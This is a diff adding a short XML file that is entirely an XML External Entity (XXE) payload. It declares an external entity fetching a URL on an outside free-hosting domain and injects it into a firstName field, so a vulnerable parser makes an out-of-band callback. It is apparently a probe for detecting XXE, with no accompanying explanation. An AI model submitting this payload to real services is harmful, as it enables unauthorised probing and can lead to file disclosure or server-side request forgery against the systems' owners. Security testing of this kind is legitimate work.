@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "https://zqweeqw1.000webhostapp.com/test.php?xxetest" >]> 
+<root>
+ <root>
+  <firstName>&xxe;</firstName>
+ </root>
+</root>
